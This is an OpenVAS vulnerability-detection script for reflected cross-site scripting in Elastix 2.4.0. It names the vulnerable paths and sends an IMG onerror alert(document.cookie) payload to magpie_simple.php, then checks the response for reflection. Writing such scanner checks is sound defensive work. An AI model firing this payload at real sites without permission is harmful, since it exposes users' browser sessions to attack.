###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_elastix_mult_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Elastix Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a users browser session in context of an affected site and
  launch other attacks.
  Impact Level: Application";

tag_affected = "Elastix version 2.4.0 Stable";
tag_insight = "- Input passed via the URL to '/libs/jpgraph/Examples/bar_csimex3.php/' is
    not properly sanitised before being returned to the user.
  - Input passed via the 'url' parameter to
    '/libs/magpierss/scripts/magpie_simple.php' is not properly sanitised
    before being returned to the user.";
tag_solution = "No solution or patch is available as of 03rd May, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.elastix.org/index.php/en/downloads/main-distro.html";
tag_summary = "This host is installed with Elastix and is prone to multiple cross
  site scripting vulnerabilities.";

if(description)
{
  script_id(803708);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-03 15:04:46 +0530 (Mon, 03 Jun 2013)");
  script_name("Elastix Multiple Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121832/elastix240-xss.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/elastix-240-cross-site-scripting");

  script_description(desc);
  script_summary("Check if Elastix is vulnerable to XSS vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/elastix", cgi_dirs()))
{
  ## Request for the search.cgi
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if(rcvRes && ">Elastix<" >< rcvRes && "http://www.elastix.org" >< rcvRes)
  {

    url = dir + '/libs/magpierss/scripts/magpie_simple.php?url="><' +
                'IMg+srC%3D+x+OnerRoR+%3D+alert(document.cookie)>';

   ## Check the response to confirm vulnerability
   if(http_vuln_check(port: port, url: url, check_header: TRUE,
       pattern: "OnerRoR = alert\(document.cookie\)>",
       extra_check: make_list("Channel:", "RSS URL:")))
    {
      security_warning(port);
      exit(0);
    }
  }
}
